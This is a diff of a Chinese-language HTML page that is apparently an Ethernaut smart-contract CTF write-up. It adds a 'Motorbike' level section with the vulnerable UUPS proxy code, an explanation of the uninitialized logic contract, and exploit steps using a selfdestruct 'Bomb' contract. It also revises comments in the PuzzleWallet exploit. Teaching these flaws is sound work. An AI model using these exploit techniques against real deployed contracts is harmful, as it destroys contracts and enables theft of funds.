@@ -2835,6 +2835,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#25-motorbike" class="md-nav__link">
+    25. Motorbike
+  </a>
+  
+    <nav class="md-nav" aria-label="25. Motorbike">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3376,6 +3403,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#25-motorbike" class="md-nav__link">
+    25. Motorbike
+  </a>
+  
+    <nav class="md-nav" aria-label="25. Motorbike">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3520,7 +3574,7 @@
 <span class="w">            </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span>
 <span class="w">            </span><span class="s2">&quot;caller is not the owner&quot;</span>
 <span class="w">        </span><span class="p">);</span>
-<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span><span class="w">  </span><span class="c1">// only used inside a function modifier and it tells Solidity to execute the rest of the code.</span>
 <span class="w">    </span><span class="p">}</span>
 
 <span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">contribute</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
@@ -4095,7 +4149,7 @@
 <span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">      </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
 <span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span><span class="w">  </span><span class="c1">// does nothing</span>
 <span class="w">      </span><span class="p">}</span>
 <span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
@@ -5300,8 +5354,9 @@ f3  // return
 <p>由于使用代理调用的方式，代理合约的 <code>pendingAdmin</code> 与逻辑合约的 <code>owner</code> 共享一个 slot，因而可先通过 <code>proposeNewAdmin</code> 更新 <code>owner</code>，随后将玩家添加到白名单中</p>
 </li>
 <li>同理，<code>maxBalance</code> 与 <code>admin</code> 共享一个 slot，而 <code>maxBalance</code> 可通过 <code>setMaxBalance</code> 更新，但首先需清空代理合约的余额</li>
+<li><code>execute</code> 依据 <code>balances</code> 中记录的对应地址的余额进行转账，而 <code>balances</code> 只能通过 <code>deposit</code> 改变</li>
 <li>
-<p>注意到 <code>multicall</code> 中 <code>depositCalled</code> 不是状态变量而是本地变量，因而嵌套调用 <code>multicall</code> 可绕过限制进行重复 <code>deposit</code></p>
+<p>注意到 <code>multicall</code> 中 <code>depositCalled</code> 不是状态变量而是函数内变量，因而嵌套调用 <code>multicall</code> 可绕过限制利用单次 transfer 进行重复 <code>deposit</code></p>
 <div class="highlight"><pre><span></span><code><span class="c1">// 部署后将攻击合约添加到白名单中</span>
 <span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>
@@ -5310,7 +5365,7 @@ f3  // return
 <span class="w">        </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="c1">// msg.value 设置为代理合约余额的 2 倍</span>
+<span class="w">    </span><span class="c1">// msg.value 设置为 0.001 eth，即代理合约初始余额</span>
 <span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
 <span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">subdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
@@ -5327,13 +5382,151 @@ f3  // return
 <p><code>delegatecall</code> 保持合约被调用时的 <code>msg.value</code></p>
 </li>
 </ul>
+<h2 id="25-motorbike">25. Motorbike<a class="headerlink" href="#25-motorbike" title="Permanent link">&para;</a></h2>
+<p>让 <code>Engine</code> 自毁，使 <code>Motorbike</code> 不可用</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">0.7.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Motorbike</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
+<span class="w">    </span><span class="c1">// constant variable does not have a storage slot</span>
+<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_logic</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">_logic</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">;</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;initialize()&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Delegates the current call to `implementation`.</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">implementation</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// solhint-disable-next-line no-inline-assembly</span>
+<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">calldatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">())</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">gas</span><span class="p">(),</span><span class="w"> </span><span class="nx">implementation</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">(),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">returndatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span>
+<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="nx">result</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">revert</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
+<span class="w">            </span><span class="k">default</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>
+<span class="w">    </span><span class="c1">// Will run if no other function in the contract matches the call data</span>
+<span class="w">    </span><span class="nx">fallback</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">slot</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">slot</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Engine</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Initializable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
+<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">horsePower</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">initialize</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">initializer</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">horsePower</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">upgrader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Upgrade the implementation of the proxy to `newImplementation`</span>
+<span class="w">    </span><span class="c1">// subsequently execute the function call</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeToAndCall</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">_authorizeUpgrade</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Restrict to upgrader role</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_authorizeUpgrade</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t upgrade&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call.</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// Initial upgrade and setup call</span>
+<span class="w">        </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Stores a new address in the EIP1967 implementation slot.</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">r</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>与透明代理模式不同，UUPS 代理模式由逻辑合约负责升级逻辑，因而代理合约部署的代价较小</li>
+<li><code>upgrader</code> 可以使用 <code>upgradeToAndCall()</code> 更新逻辑合约并调用</li>
+<li><code>Motorbike</code> 在部署时通过 <code>delegatecall</code> 调用 <code>Engine</code> 的 <code>initialize()</code>，<code>initialize()</code> 使用 <code>initializer</code> 函数修饰符，避免再次初始化<ul>
+<li><code>initializer</code> 修饰符使用状态变量 <code>initialized</code> 和 <code>initializing</code> 记录初始化状态</li>
+</ul>
+</li>
+<li><code>initialized</code> 存储在 <code>Motorbike</code> 实例中，而不是 <code>Engine</code>，因而可以直接调用 <code>Engine</code> 实例的 <code>initialize()</code> 再更新其逻辑合约的地址并调用</li>
+<li><em>不要让逻辑合约处于未初始化状态</em></li>
+</ul>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 获取 Engine 实例的地址</span>
+<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span><span class="p">);</span>
+<span class="s2">&quot;0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1">// 部署新的逻辑合约</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Bomb</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">// 调用 initialize 成为 upgrader，随后调用 upgradeToAndCall() 更新逻辑合约</span>
+</code></pre></div>
+<h3 id="_16">参考资料<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786">UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups">Proxies - OpenZeppelin Docs</a></li>
+<li><a href="https://docs.soliditylang.org/en/latest/contracts.html#constants">Constant and Immutable State Variables</a></li>
+<li><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">Writing Upgradeable Contracts - OpenZeppelin Docs</a></li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">January 28, 2023 00:28:16</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">February 17, 2023 16:24:42</span>
       
     
   </small>
